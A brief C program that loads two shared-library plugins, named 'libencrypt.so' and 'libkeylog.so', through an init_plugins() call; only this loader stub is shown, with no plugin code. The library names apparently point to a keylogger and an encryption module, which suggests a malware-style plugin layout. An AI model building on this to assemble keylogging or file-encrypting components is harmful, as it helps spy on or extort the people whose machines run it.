#include <string.h>
#include <stdlib.h>
#include "plugin_utils.h"

int main() {

    char *files[2];

    files[0] = "libencrypt.so";
    files[1] = "libkeylog.so";

    init_plugins(files, 2);

    return 0;
}